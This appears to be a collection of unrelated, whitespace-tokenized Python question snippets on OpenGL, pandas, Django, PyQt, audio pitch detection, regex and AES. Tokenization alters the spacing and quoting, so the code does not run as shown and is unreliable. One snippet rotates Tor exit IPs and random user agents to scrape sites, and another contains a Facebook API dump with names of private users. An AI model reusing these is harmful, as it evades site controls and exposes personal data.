"glViewport ( 0 , 0 , width , height ) glMatrixMode ( GL_PROJECTION ) glLoadIdentity ( ) gluPerspective ( 60.0 , float ( width ) /height , .1 , 10000 . ) glMatrixMode ( GL_MODELVIEW ) glClearDepth ( 1.0 ) glShadeModel ( GL_FLAT ) glEnable ( GL_DEPTH_TEST ) glDepthFunc ( GL_LEQUAL ) glHint ( GL_PERSPECTIVE_CORRECTION_HINT , GL_NICEST ) glClear ( GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT | GL_STENCIL_BUFFER_BIT ) stage.set3DMode ( window.width , window.height ) builder.buildMap ( ) stage.set2DMode ( window.width , window.height ) glBegin ( GL_QUADS ) glVertex2i ( 0 , 0 ) glVertex2i ( 0 , 200 ) glVertex2i ( 200 , 200 ) glVertex2i ( 200 , 0 ) glEnd ( ) glDisable ( GL_DEPTH_TEST ) glMatrixMode ( GL_PROJECTION ) glLoadIdentity ( ) gluOrtho2D ( 0 , width , 0 , height ) glMatrixMode ( GL_MODELVIEW ) glEnable ( GL_DEPTH_TEST ) glMatrixMode ( GL_PROJECTION ) glLoadIdentity ( ) gluPerspective ( 60.0 , float ( width ) /float ( height ) , .1 , 10000 . ) glMatrixMode ( GL_MODELVIEW )"
colANaNTrueTrueTrueTrueNaNTrueNaNNaNTrueTrueTrueTrueTrue ColA SequenceNaN 0True 0True 1True 2True 3NaN 0True 0NaN 0NaN 0True 0True 1True 2True 3True 4
"[ X X X X ] [ 0 X X X ] [ 0 0 X X ] [ 0 0 0 X ] [ ( 0,0 ) , ( 0,1 ) , ( 0,2 ) , ( 0,3 ) , ( 1,1 ) , ( 1,2 ) , ( 1,3 ) , ( 2,2 ) , ( 2,3 ) , ( 3,3 ) ]"
"from selenium import webdriverfrom selenium.webdriver.common.desired_capabilities import DesiredCapabilitiesfrom fake_useragent import UserAgentfrom stem import Signalfrom stem.control import Controllerclass MyBrowserClass : def start_browser ( ) : service_args = [ ' -- proxy=127.0.0.1:8118 ' , ' -- proxy-type= http ' , ] dcap = dict ( DesiredCapabilities.PHANTOMJS ) dcap [ `` phantomjs.page.settings.userAgent '' ] = ( UserAgent ( ) .random ) browser = webdriver.PhantomJS ( service_args = service_args , desired_capabilities=dcap ) return browser def set_new_ip ( ) : with Controller.from_port ( port=9051 ) as controller : controller.authenticate ( password=password ) controller.signal ( Signal.NEWNYM ) import mybrowserimport timebrowser= mybrowser.MyBrowserClass.start_browser ( ) browser.get ( `` https : //canihazip.com/s '' ) print ( browser.page_source ) mybrowser.MyBrowserClass.set_new_ip ( ) time.sleep ( 12 ) browser.get ( `` https : //canihazip.com/s '' ) print ( browser.page_source ) ... browser.get ( `` https : //canihazip.com/s '' ) print ( browser.page_source ) browser.get ( `` https : //check.torproject.org/ '' ) print ( browser.find_element_by_xpath ( '//div [ @ class= '' content '' ] ' ) .text ) mybrowser.set_new_ip ( ) time.sleep ( 12 ) browser.get ( `` https : //check.torproject.org/ '' ) print ( browser.find_element_by_xpath ( '//div [ @ class= '' content '' ] ' ) .text ) browser.get ( `` https : //canihazip.com/s '' ) print ( browser.page_source ) 42.38.215.198 ( canihazip before mybrowser.set_new_ip ( ) ) 42.38.215.198 ( check.torproject before mybrowser.set_new_ip ( ) ) 106.184.130.30 ( check.torproject after mybrowser.set_new_ip ( ) ) 42.38.215.198 ( canihazip after mybrowser.set_new_ip ( ) ) forward-socks5t / 127.0.0.1:9050 ControlPort 9051HashedControlPassword : xxxx"
open ( '/proc/ { } /cmdline'.format ( os.getpid ( ) ) ) .read ( ) .split ( '\0 ' )
"index , labels1 , created the tower2 , destroyed the tower3 , created the swimming pool4 , destroyed the swimming pool [ 'created ' , 'tower ' , 'destroyed ' , 'swimming pool ' ] index , created , destroyed , tower , swimming pool1,1,0,1,02,0,1,1,03,1,0,0,14,0,1,0,1"
"get_data = BigQueryGetDataOperator ( task_id='get_data_from_bq ' , dataset_id='test_dataset ' , table_id='Transaction_partitions ' , max_results='100 ' , selected_fields='DATE ' , bigquery_conn_id='airflow-service-account ' )"
chmod +x createdb.pynohup python ./createdb.py & ( env ) $ nohup ./createdb.py & [ 1 ] 32257 ( env ) $ nohup : ignoring input and appending output to 'nohup.out ' ( env ) $ nohup ./createdb.py & [ 1 ] 32257 ( env ) $ nohup : ignoring input and appending output to 'nohup.out ' [ 1 ] + Exit 1 nohup ./createdb.py
"def detect_pitch ( y , sr , onset_offset=5 , fmin=75 , fmax=1400 ) : y = highpass_filter ( y , sr ) onset_frames = librosa.onset.onset_detect ( y=y , sr=sr ) pitches , magnitudes = librosa.piptrack ( y=y , sr=sr , fmin=fmin , fmax=fmax ) notes = [ ] for i in range ( 0 , len ( onset_frames ) ) : onset = onset_frames [ i ] + onset_offset index = magnitudes [ : , onset ] .argmax ( ) pitch = pitches [ index , onset ] if ( pitch ! = 0 ) : notes.append ( librosa.hz_to_note ( pitch ) ) return notesdef highpass_filter ( y , sr ) : filter_stop_freq = 70 # Hz filter_pass_freq = 100 # Hz filter_order = 1001 # High-pass filter nyquist_rate = sr / 2. desired = ( 0 , 0 , 1 , 1 ) bands = ( 0 , filter_stop_freq , filter_pass_freq , nyquist_rate ) filter_coefs = signal.firls ( filter_order , bands , desired , nyq=nyquist_rate ) # Apply high-pass filter filtered_audio = signal.filtfilt ( filter_coefs , [ 1 ] , y ) return filtered_audio"
"import facebook as fiimport jsongraph = fi.GraphAPI ( 'Access Token ' ) data = json.dumps ( graph.get_object ( 'DSIfootcandy/posts ' ) ) { `` paging '' : { `` next '' : `` https : //graph.facebook.com/v2.0/425073257683630/posts ? access_token= & limit=25 & until=1449201121 & __paging_token=enc_AdD0DL6sN3aDZCwfYY25rJLW9IZBZCLM1QfX0venal6rpjUNvAWZBOoxTjbOYZAaFiBImzMqiv149HPH5FBJFo0nSVOPqUy78S0YvwZDZD '' , `` previous '' : `` https : //graph.facebook.com/v2.0/425073257683630/posts ? since=1450843741 & access_token= & limit=25 & __paging_token=enc_AdCYobFJpcNavx6STzfPFyFe6eQQxRhkObwl2EdulwL7mjbnIETve7sJZCPMwVm7lu7yZA5FoY5Q4sprlQezF4AlGfZCWALClAZDZD & __previous=1 '' } , `` data '' : [ { `` picture '' : `` https : //fbcdn-photos-e-a.akamaihd.net/hphotos-ak-xfa1/v/t1.0-0/p130x130/1285_5066979392443_n.png ? oh=b37a42ee58654f08af5abbd4f52b1ace & oe=570898E7 & __gda__=1461440649_aa94b9ec60f22004675c4a527e8893f '' , `` is_hidden '' : false , `` likes '' : { `` paging '' : { `` cursors '' : { `` after '' : `` MTU3NzQxODMzNTg0NDcwNQ== '' , `` before '' : `` MTU5Mzc1MjA3NDE4ODgwMA== '' } } , `` data '' : [ { `` id '' : `` 1593752074188800 '' , `` name '' : `` Maduri Priyadarshani '' } , { `` id '' : `` 427605680763414 '' , `` name '' : `` Darshi Mashika '' } , { `` id '' : `` 599793563453832 '' , `` name '' : `` Shakeer Nimeshani Shashikala '' } , { `` id '' : `` 1577418335844705 '' , `` name '' : `` Däzlling Jalali Muishu '' } ] } , `` from '' : { `` category '' : `` Retail and Consumer Merchandise '' , `` name '' : `` Footcandy '' , `` category_list '' : [ { `` id '' : `` 2239 '' , `` name '' : `` Retail and Consumer Merchandise '' } ] , `` id '' : `` 425073257683630 '' } , `` name '' : `` Timeline Photos '' , `` privacy '' : { `` allow '' : `` '' , `` deny '' : `` '' , `` friends '' : `` '' , `` description '' : `` '' , `` value '' : `` '' } , `` is_expired '' : false , `` comments '' : { `` paging '' : { `` cursors '' : { `` after '' : `` WTI5dGJXVnVkRjlqZFhKemIzSUVXdNVFExTURRd09qRTBOVEE0TkRRNE5EVT0= '' , `` before '' : `` WTI5dGJXVnVkRjlqZFhKemIzNE16Y3dNVFExTVRFNE9qRTBOVEE0TkRRME5UVT0= '' } } , `` data '' : [ { `` from '' : { `` name '' : `` NiFû Shafrà '' , `` id '' : `` 1025030640553 '' } , `` like_count '' : 0 , `` can_remove '' : false , `` created_time '' : `` 2015-12-23T04:20:55+0000 '' , `` message '' : `` wow lovely one '' , `` id '' : `` 50018692683829_500458145118 '' , `` user_likes '' : false } , { `` from '' : { `` name '' : `` Shamnaz Lukmanjee '' , `` id '' : `` 160625809961884 '' } , `` like_count '' : 0 , `` can_remove '' : false , `` created_time '' : `` 2015-12-23T04:27:25+0000 '' , `` message '' : `` Nice '' , `` id '' : `` 500186926838929_500450145040 '' , `` user_likes '' : false } ] } , `` actions '' : [ { `` link '' : `` https : //www.facebook.com/425073257683630/posts/5001866838929 '' , `` name '' : `` Comment '' } , { `` link '' : `` https : //www.facebook.com/42507683630/posts/500186926838929 '' , `` name '' : `` Like '' } ] , `` updated_time '' : `` 2015-12-23T04:27:25+0000 '' , `` link '' : `` https : //www.facebook.com/DSIFootcandy/photos/a.438926536298302.1073741827.4250732576630/50086926838929/ ? type=3 '' , `` object_id '' : `` 50018692838929 '' , `` shares '' : { `` count '' : 3 } , `` created_time '' : `` 2015-12-23T04:09:01+0000 '' , `` message '' : `` Reach new heights in the cute and extremely comfortable \ '' Silviar\ '' www.focandy.lk '' , `` type '' : `` photo '' , `` id '' : `` 425077683630_50018926838929 '' , `` status_type '' : `` added_photos '' , `` icon '' : `` https : //www.facebook.com/images/icons/photo1.gif '' } ] } item | Like_id |Like_username | comments_userid |comments_username|comment ( msg ) | -- -- -+ -- -- -- -- -+ -- -- -- -- -- -- -- + -- -- -- -- -- -- -- -- -+ -- -- -- -- -- -- -- -- -+ -- -- -- -- -- -- +Bag | 45546 | noel | 641 | James | nice work | -- -- -+ -- -- -- -- -+ -- -- -- -- -- -- -- + -- -- -- -- -- -- -- -- -+ -- -- -- -- -- -- -- -- -+ -- -- -- -- -- -- +"
"_column_name_generator ( ) = [ ' A ' , ' B ' , ... , 'AA ' , 'AB ' , ... , 'BA ' , 'BB ' , ... , 'CV ' ] import stringdef _column_name_generator ( ) : column_names = [ ] for x in range ( 0 , 100 ) : if x < 26 : column_names.append ( string.ascii_uppercase [ x % 26 ] ) else : column_names.append ( column_names [ x/26 - 1 ] + string.ascii_uppercase [ x % 26 ] ) return column_namescontainer = [ ] for column_name , num in zip ( _column_name_generator ( ) , range ( 0 , 10 ) ) : container.append ( column_name + str ( num ) ) print _column_name_generator ( ) print containercontainer = [ 'A0 ' , 'B1 ' , 'C2 ' , 'D3 ' , 'E4 ' , 'F5 ' , 'G6 ' , 'H7 ' , 'I8 ' , 'J9 ' ]"
"index duration 1 7 year 2 2day3 4 week4 8 month index duration number time1 7 year 7 year2 2day 2 day3 4 week 4 week4 8 month 8 month df [ 'numer ' ] = df.duration.replace ( r'\d . * ' , r'\d ' , regex=True , inplace = True ) df [ 'time ' ] = df.duration.replace ( r'\.w.+ ' , r'\w.+ ' , regex=True , inplace = True ) index duration number time time_days 1 7 year 7 year 365 2 2day 2 day 1 3 4 week 4 week 7 4 8 month 8 month 30df [ 'time_day ' ] = df.time.replace ( r ' ( year|month|week|day ) ' , r ' ( 365|30|7|1 ) ' , regex=True , inplace=True )"
> > > class A ( ) : ... def f ( ) : pass ... > > > A.f < function A.f at 0x7fcaef304268 > > > > A ( ) .f < bound method A.f of < __main__.A object at 0x7fcaef2fae80 > > > set.union < method 'union ' of 'set ' objects >
"Path ( '/a/b/c/d ' ) .rename ( Path ( '/w/x/y/z ' ) ) FileNotFoundError : [ Errno 2 ] No such file or directory : '/a/b/c/d ' - > '/w/x/y/z ' os.makedirs ( Path ( '/w/x/y ' , exist_ok=True ) Path ( '/a/b/c/d ' ) .rename ( Path ( '/w/x/y/z ' ) )"
from mpl_toolkits.mplot3d import Axes3Dimport matplotlib.pyplot as pltfig = plt.figure ( ) ax = fig.gca ( projection='3d ' ) ./tools.py:62:9 : F401 'mpl_toolkits.mplot3d.Axes3D ' imported but unused
"static PyObject * spam_system ( PyObject *self , PyObject *args ) { const char *command ; int sts ; if ( ! PyArg_ParseTuple ( args , `` s '' , & command ) ) return NULL ; sts = system ( command ) ; return Py_BuildValue ( `` i '' , sts ) ; }"
"A = pd.SparseDataFrame ( [ [ ' a',0,0 , ' b ' ] , [ 0,0,0 , ' c ' ] , [ 0,0,0,0 ] , [ 0,0,0 , ' a ' ] ] ) A 0 1 2 30 a 0 0 b1 0 0 0 c2 0 0 0 03 0 0 0 a A.replace ( 0 , np.nan ) TypeError : can not convert int to an sparseblock A.to_dense ( ) .replace ( 0 , np.nan ) .to_sparse ( )"
"list_A = [ ' 0 ' , ' 1 ' , ' 2 ' ] list_B = [ ' 2 ' , ' 0 ' , ' 1 ' ] matrix = [ [ '56 ' , '23 ' , ' 4 ' ] , [ '45 ' , ' 5 ' , '67 ' ] , [ ' 1 ' , '52 ' , '22 ' ] ]"
"class Person : def __init__ ( self , person_dict ) : try : self.name = person_dict [ 'name ' ] except Exception : pass def getName ( self ) : return self.namepdict = { } p = Person ( pdict ) print p.getName ( )"
"from __future__ import unicode_literalsimport sysfrom PyQt4 import *from PyQt4 import QtGuifrom PyQt4.QtCore import SIGNAL , QObjectimport UI_Testclass Testdialog ( QtGui.QDialog , UI_Test.Ui_Dialog ) : def __init__ ( self , parent=None ) : super ( Testdialog , self ) .__init__ ( parent ) self.setupUi ( self ) print ( `` Connect buttons '' ) # gives the expected output self.connect ( self.pushButton_Ok , SIGNAL ( `` clicked ( ) '' ) , self.clickedOk ) self.connect ( self.pushButton_Cancel , SIGNAL ( `` clicked ( ) '' ) , self.clickedCancel ) # Alternativly I have tríed the following without improvement : # self.pushButton_Ok.clicked.connect ( self.clickedOk ) # QObject.connect ( self.pushButton_Cancel , SIGNAL ( `` clicked ( ) '' ) , self.clickedCancel ) def clickedCancel ( self ) : print ( `` Cancel '' ) # Question : Why is nothing happening here ? def clickedOk ( self ) : print ( `` Ok '' ) # Question : Why is nothing happening here ? if True : qApp = QtGui.QApplication ( sys.argv ) Dialog = QtGui.QDialog ( ) u = Testdialog ( ) u.setupUi ( Dialog ) Dialog.exec_ ( ) sys.exit ( qApp.exec_ ( ) ) # File : UI_Test.pyfrom PyQt4 import QtCore , QtGuitry : _fromUtf8 = QtCore.QString.fromUtf8except AttributeError : def _fromUtf8 ( s ) : return stry : _encoding = QtGui.QApplication.UnicodeUTF8 def _translate ( context , text , disambig ) : return QtGui.QApplication.translate ( context , text , disambig , _encoding ) except AttributeError : def _translate ( context , text , disambig ) : return QtGui.QApplication.translate ( context , text , disambig ) class Ui_Dialog ( object ) : def setupUi ( self , Dialog ) : Dialog.setObjectName ( _fromUtf8 ( `` Dialog '' ) ) Dialog.resize ( 271 , 70 ) self.pushButton_Ok = QtGui.QPushButton ( Dialog ) self.pushButton_Ok.setGeometry ( QtCore.QRect ( 20 , 20 , 93 , 28 ) ) self.pushButton_Ok.setObjectName ( _fromUtf8 ( `` pushButton_Ok '' ) ) self.pushButton_Cancel = QtGui.QPushButton ( Dialog ) self.pushButton_Cancel.setGeometry ( QtCore.QRect ( 130 , 20 , 93 , 28 ) ) self.pushButton_Cancel.setObjectName ( _fromUtf8 ( `` pushButton_Cancel '' ) ) self.retranslateUi ( Dialog ) QtCore.QMetaObject.connectSlotsByName ( Dialog ) def retranslateUi ( self , Dialog ) : Dialog.setWindowTitle ( _translate ( `` Dialog '' , `` Dialog '' , None ) ) self.pushButton_Ok.setText ( _translate ( `` Dialog '' , `` OK '' , None ) ) self.pushButton_Cancel.setText ( _translate ( `` Dialog '' , `` Cancel '' , None ) )"
{ % load staticfiles % } < ! DOCTYPE html > < html > < head > < title > My site < /title > < link rel= '' stylesheet '' type= '' text/css '' href= '' { % static 'css/style.css ' % } '' / > < link rel= '' stylesheet '' type= '' text/css '' href= '' { % static 'css/bootsrap.min.css ' % } '' / > < /head > < body > < h1 > Test title < /h1 > { % block content % } { % endblock % } < /body > < /html > { % extends 'base.html ' % } { % block content % } { % if latest_smartphones_list % } < ul > { % for s in latest_smartphones_list % } < li > < a href= '' # '' > { { s.brand } } { { s.name } } < /a > < /li > { % endfor % } < /ul > { % else % } < p > No smarphones available. < /p > { % endif % } { % endblock % } { % load 'menu.html ' % }
"class A : @ classmethod def method ( cls_or_self ) : # get reference to object when A ( ) .method ( ) or to class when A.method ( ) code class A : def method ( self = None , *params ) : code # or def method2 ( self = None , **params ) : code # but what I need is rather normal parameters , not optional and named args : def method3 ( self_or_cls , a , b=1 , c=2 , *p , **kw ) : code"
from quart import Quartimport asyncioimport timeapp = Quart ( __name__ ) @ app.route ( '/ ' ) async def pdf ( ) : t1 = time.time ( ) await generatePdf ( ) return 'Time to execute : { } seconds'.format ( time.time ( ) - t1 ) async def generatePdf ( ) : await asyncio.sleep ( 5 ) # sync generatepdf # send pdf link to emailapp.run ( )
"Number_of_lists=3 # user sets this value , can be any positive integerMy_list= { } for j in range ( 1 , Number_of_lists+1 ) : My_list [ j ] = [ ( x , y , z ) ] All_my_lists=My_list [ 1 ] +My_list [ 2 ] +My_list [ 3 ]"
"[ [ [ time_step_trial_0 , feature , feature , ... ] [ time_step_trial_0 , feature , feature , ... ] ] [ [ time_step_trial_1 , feature , feature , ... ] [ time_step_trial_1 , feature , feature , ... ] ] [ [ time_step_trial_2 , feature , feature , ... ] [ time_step_trial_2 , feature , feature , ... ] ] ]"
> > > 5+1015 > > > a = 5 + 10 > > > a15 In [ 1 ] : 5+10 1Out [ 1 ] : 1
"from django.contrib.sitemaps import Sitemapfrom schools.models import Schoolclass SchoolSitemap ( Sitemap ) : changefreq = `` weekly '' priority = 0.6 def items ( self ) : return School.objects.filter ( status = 2 ) def get_absolute_url ( self ) : return reverse ( 'schools : school_about ' , kwargs= { 'school_id ' : self.pk } )"
"from sklearn.neural_network import BernoulliRBMimport numpy as npfrom sklearn import linear_model , datasets , metricsfrom sklearn.model_selection import train_test_splitfrom sklearn.pipeline import Pipelinedigits = datasets.load_digits ( ) X = np.asarray ( digits.data , 'float32 ' ) Y = digits.targetX = ( X - np.min ( X , 0 ) ) / ( np.max ( X , 0 ) + 0.0001 ) # 0-1 scalingX_train , X_test , Y_train , Y_test = train_test_split ( X , Y , test_size=0.2 , random_state=0 ) logistic = linear_model.LogisticRegression ( C=100 ) rbm1 = BernoulliRBM ( n_components=100 , learning_rate=0.06 , n_iter=100 , verbose=1 , random_state=101 ) rbm2 = BernoulliRBM ( n_components=80 , learning_rate=0.06 , n_iter=100 , verbose=1 , random_state=101 ) rbm3 = BernoulliRBM ( n_components=60 , learning_rate=0.06 , n_iter=100 , verbose=1 , random_state=101 ) DBN3 = Pipeline ( steps= [ ( 'rbm1 ' , rbm1 ) , ( 'rbm2 ' , rbm2 ) , ( 'rbm3 ' , rbm3 ) , ( 'logistic ' , logistic ) ] ) DBN3.fit ( X_train , Y_train ) print ( `` Logistic regression using RBM features : \n % s\n '' % ( metrics.classification_report ( Y_test , DBN3.predict ( X_test ) ) ) )"
"from scipy import integratefrom numpy import *import scipy as spimport pylab as plimport numpy as npimport mathe = 1.60217646*10** ( -19 ) r = 3000gap = 400*10** ( -6 ) *eg = ( gap ) **2t = 0.02k = 1.3806503*10** ( -23 ) kt = k*tv_values = np.arange ( 0,0.001,0.0001 ) I= [ ] for v in v_values : val , err = integrate.quad ( lambda E : ( 1/ ( e*r ) ) * ( abs ( E ) /np.sqrt ( abs ( E**2-g ) ) ) * ( abs ( E+e*v ) / ( np.sqrt ( abs ( ( E+e*v ) **2-g ) ) ) ) * ( ( 1/ ( 1+math.exp ( ( E+e*v ) /kt ) ) ) - ( 1/ ( 1+math.exp ( E/k*t ) ) ) ) , -inf , ( -gap-e*v ) *0.9 ) I.append ( val ) I = array ( I ) I2= [ ] for v in v_values : val2 , err = integrate.quad ( lambda E : ( 1/ ( e*r ) ) * ( abs ( E ) /np.sqrt ( abs ( E**2-g ) ) ) * ( abs ( E+e*v ) / ( np.sqrt ( abs ( ( E+e*v ) **2-g ) ) ) ) * ( ( 1/ ( 1+math.exp ( ( E+e*v ) /kt ) ) ) - ( 1/ ( 1+math.exp ( E/k*t ) ) ) ) , gap*0.9 , inf ) I2.append ( val2 ) I2 = array ( I2 ) I [ np.isnan ( I ) ] = 0I [ np.isnan ( I2 ) ] = 0pl.plot ( v_values , I , '-b ' , v_values , I2 , '-b ' ) pl.show ( )"
"date_rng = pd.date_range ( '2019-01-01 ' , freq= 's ' , periods=400 ) df = pd.DataFrame ( np.random.lognormal ( .005 , .5 , size= ( len ( date_rng ) , 3 ) ) , columns= [ 'data1 ' , 'data2 ' , 'data3 ' ] , index= date_rng ) s = df [ 'data1 ' ] # Find peaks ( max ) .peak_indexes = signal.argrelextrema ( s.values , np.greater ) peak_indexes = peak_indexes [ 0 ] # Find valleys ( min ) .valley_indexes = signal.argrelextrema ( s.values , np.less ) valley_indexes = valley_indexes [ 0 ] # Merge peaks and valleys data points using pandas.df_peaks = pd.DataFrame ( { 'date ' : s.index [ peak_indexes ] , 'zigzag_y ' : s [ peak_indexes ] } ) df_valleys = pd.DataFrame ( { 'date ' : s.index [ valley_indexes ] , 'zigzag_y ' : s [ valley_indexes ] } ) df_peaks_valleys = pd.concat ( [ df_peaks , df_valleys ] , axis=0 , ignore_index=True , sort=True ) # Sort peak and valley datapoints by date.df_peaks_valleys = df_peaks_valleys.sort_values ( by= [ 'date ' ] ) # Instantiate axes . ( fig , ax ) = plt.subplots ( ) # Plot zigzag trendline.ax.plot ( df_peaks_valleys [ 'date ' ] .values , df_peaks_valleys [ 'zigzag_y ' ] .values , color='red ' , label= '' Zigzag '' ) # Plot original line.ax.plot ( s.index , s , linestyle='dashed ' , color='black ' , label= '' Org . line '' , linewidth=1 ) # Format time.ax.xaxis_date ( ) ax.xaxis.set_major_formatter ( mdates.DateFormatter ( `` % Y- % m- % d '' ) ) plt.gcf ( ) .autofmt_xdate ( ) # Beautify the x-labelsplt.autoscale ( tight=True ) plt.legend ( loc='best ' ) plt.grid ( True , linestyle='dashed ' )"
"import redef get_attr ( str , attr ) : m = re.search ( attr + r'= ( \w+ ) ' , str ) return None if not m else m.group ( 1 ) str = 'type=greeting hello=world'print get_attr ( str , 'type ' ) # greeting print get_attr ( str , 'hello ' ) # worldprint get_attr ( str , 'attr ' ) # None return None if not m else m.group ( 1 ) return ( m ? m.group ( 1 ) : None )"
"predictions [ predictions < 1e-10 ] = 1e-10 def logprob ( predictions , labels ) : `` '' '' Log-probability of the true labels in a predicted batch . '' '' '' predictions [ predictions < 1e-10 ] = 1e-10 return np.sum ( np.multiply ( labels , -np.log ( predictions ) ) ) / labels.shape [ 0 ]"
"class Tumblr ( object ) : def __init__ ( self , user ) : self.user = user def get_posts ( self ) : `` '' '' Use tumblr api to return a user 's posts . '' '' '' return client [ 'blog ' ] [ 'posts ' ] def parse_images ( self ) : `` '' '' Returns images . '' '' '' images = [ ] for post in posts : if 'image ' in post : images.append ( post [ 'image ' ] ) return images def parse_videos ( self ) : `` '' '' Returns videos . `` `` '' def main ( ) : # this is a function , and thus not OOP ?"
"# When I run import localeimport sysprint ( sys.getdefaultencoding ( ) ) print ( locale.getpreferredencoding ( ) ) # I get utf-8cp1252 [ Finished in 0.385s ] # Error for print ( '\u2705 ' ) Traceback ( most recent call last ) : File `` C : \Users\en4ijjp\Desktop\junk.py '' , line 7 , in < module > print ( '\u2705 ' ) .decode ( 'utf-8 ' ) File `` C : \Users\en4ijjp\AppData\Local\Programs\Python\Python37\lib\encodings\cp1252.py '' , line 19 , in encodereturn codecs.charmap_encode ( input , self.errors , encoding_table ) [ 0 ] UnicodeEncodeError : 'charmap ' codec ca n't encode character '\u2705 ' in position 0 : character maps to < undefined > [ Finished in 0.379s ]"
def infinite_stream ( start : int ) - > Iterator [ int ] : while True : yield start start += 1 from typing import Iteratordef infinite_stream ( start : int ) - > Iterator [ int ] : while True : yield start start += 1def print_infinite_stream ( inf_iterator : Iterator [ int ] ) : for x in inf_iterator ( 5 ) : print ( x ) print_infinite_stream ( infinite_stream )
"[ v3_extensions ] subjectAltName = email : foo @ example.org , otherName : pkinitSan ; SEQUENCE : krb_princ_name_1 [ krb_princ_name_1 ] realm = EXP:0 , GeneralString : EXAMPLE.ORG principal_name = EXP:1 , SEQUENCE : krb_princ_seq_1 [ krb_princ_seq_1 ] name_type = EXP:0 , INTEGER:1 name_string = EXP:0 , SEQUENCE : krb_principal_1 [ krb_principal_1 ] princ0 = GeneralString : foo"
1 2 3 45 6 7 89 10 11 1213 14 15 16
"[ [ ' o ' , ' a ' , ' a ' , ' n ' ] , [ ' e ' , 't ' , ' a ' , ' e ' ] , [ ' i ' , ' h ' , ' k ' , ' r ' ] , [ ' i ' , ' f ' , ' l ' , ' v ' ] ] class TrieNode ( ) : def __init__ ( self ) : self.children = collections.defaultdict ( TrieNode ) self.isWord = Falseclass Trie ( ) : def __init__ ( self ) : self.root = TrieNode ( ) def insert ( self , word ) : node = self.root for w in word : node = node.children [ w ] node.isWord = True def search ( self , word ) : node = self.root for w in word : node = node.children.get ( w ) if not node : return False return node.isWordclass Solution ( object ) : def findWords ( self , board , words ) : res = [ ] trie = Trie ( ) node = trie.root for w in words : trie.insert ( w ) for i in xrange ( len ( board ) ) : for j in xrange ( len ( board [ 0 ] ) ) : self.dfs ( board , node , i , j , `` '' , res ) return res def dfs ( self , board , node , i , j , path , res ) : if node.isWord : res.append ( path ) node.isWord = False if i < 0 or i > = len ( board ) or j < 0 or j > = len ( board [ 0 ] ) : return tmp = board [ i ] [ j ] node = node.children.get ( tmp ) if not node : return board [ i ] [ j ] = `` # '' self.dfs ( board , node , i+1 , j , path+tmp , res ) self.dfs ( board , node , i-1 , j , path+tmp , res ) self.dfs ( board , node , i , j-1 , path+tmp , res ) self.dfs ( board , node , i , j+1 , path+tmp , res ) board [ i ] [ j ] = tmp"
"import rereobj = re.compile ( r'^ ( ? =.* ? ( John ) ) ( ? =.* ? ( Peter ) ) . * $ ' , re.MULTILINE ) string = `` 'John and PeterPeter and JohnJames and Peter and John '' 're.findall ( reobj , string ) [ ( 'John ' , 'Peter ' ) , ( 'John ' , 'Peter ' ) , ( 'John ' , 'Peter ' ) ]"
"import jsonimport osimport sysimport urllibimport requestspayload_file = Nonepayload = Noneprint 'Loading Config ' # Get the directory path of this file . When using any relative file paths make # sure they are relative to current_dir so that the script can be run from any CWD.current_dir = os.path.dirname ( os.path.abspath ( __file__ ) ) # Reads in the config.json file then parses itconfig = json.loads ( open ( os.path.join ( current_dir , '.. ' , 'config.json ' ) ) .read ( ) ) print 'Parsing Payload'for i in range ( len ( sys.argv ) ) : if sys.argv [ i ] == `` -- json '' and ( i + 1 ) < len ( sys.argv ) : payload = json.loads ( sys.argv [ i + 1 ] ) elif sys.argv [ i ] == `` -payload '' and ( i + 1 ) < len ( sys.argv ) : payload_file = sys.argv [ i + 1 ] with open ( payload_file , ' r ' ) as f : payload = json.loads ( f.read ( ) ) breakprint 'Configuring youtube with token { 0 } '.format ( payload [ 'token ' ] ) print 'Downloading video ... ' # See how big it isf = urllib.urlopen ( payload [ 'url ' ] ) content_length = int ( f.headers [ `` Content-Length '' ] ) # Download it # urllib.urlretrieve ( payload [ 'url ' ] , `` video.mp4 '' ) metadata = { 'snippet ' : { 'title ' : payload [ 'title ' ] , `` categoryId '' : 22 } , 'status ' : { `` privacyStatus '' : `` public '' , `` embeddable '' : True , `` license '' : `` youtube '' } } if 'tags ' in payload : metadata [ 'snippet ' ] [ 'tags ' ] = payload [ 'tags ' ] if 'description ' in payload : metadata [ 'snippet ' ] [ 'description ' ] = payload [ 'description ' ] headers = { 'Authorization ' : 'Bearer { 0 } '.format ( payload [ 'token ' ] ) , 'Content-Type ' : 'application/json ; charset=UTF-8 ' , 'Content-Length ' : json.dumps ( metadata ) .__len__ ( ) , ' X-Upload-Content-Length ' : content_length , ' X-Upload-Content-Type ' : 'video/* ' , } print 'Attempting to upload video'print headers # upload video filer = requests.post ( 'https : //www.googleapis.com/upload/youtube/v3/videos ? uploadType=resumable & part=snippet , status ' , data=metadata , headers=headers ) ; print `` RESPONSE ! `` print r.text # files = { # 'file ' : video_file , # } # r = requests.post ( 'https : //www.googleapis.com/upload/youtube/v3/videos ' , data= { `` video '' : video } , headers=headers ) ; Loading ConfigParsing PayloadConfiguring youtube with token < access-token > Downloading video ... Attempting to upload video { ' X-Upload-Content-Length ' : 51998563 , 'Content-Length ' : 578 , 'Content-Type ' : 'application/json ; charset=UTF-8 ' , ' X-Upload-Content-Type ' : 'video/* ' , 'Authorization ' : 'Bearer < access-token > ' } RESPONSE ! { `` error '' : { `` errors '' : [ { `` domain '' : `` global '' , `` reason '' : `` parseError '' , `` message '' : `` Parse Error '' } ] , `` code '' : 400 , `` message '' : `` Parse Error '' } }"
"from cryptography.hazmat.primitives.ciphers import Cipher , modes , algorithmsfrom cryptography.hazmat.backends import default_backend # http : //cryptography.iofrom Crypto.Cipher import AES # http : //pycrypto.orgkey = b'Sixteen byte key'iv = b'Sixteen byte ivv'cipher1 = AES.new ( key , AES.MODE_CFB , iv ) cipher2 = Cipher ( algorithms.AES ( key ) , modes.CFB ( iv ) , default_backend ( ) ) plaintext = b '' Plaintext '' print ( cipher1.encrypt ( plaintext ) ) print ( cipher1.decrypt ( plaintext ) ) print ( cipher2.encryptor ( ) .update ( plaintext ) ) print ( cipher2.decryptor ( ) .update ( plaintext ) ) b'\xe4\xb4\xeb\xe3Si\x9ap\xee ' b ' 7\xda\x98\xee\x05\xe4\xa0\xc7 , ' b'\xe4 '' \xd4mo\xa3 ; \xa9\xe0 ' b'\xe4 '' \xd4mo\xa3 ; \xa9\xe0 '"
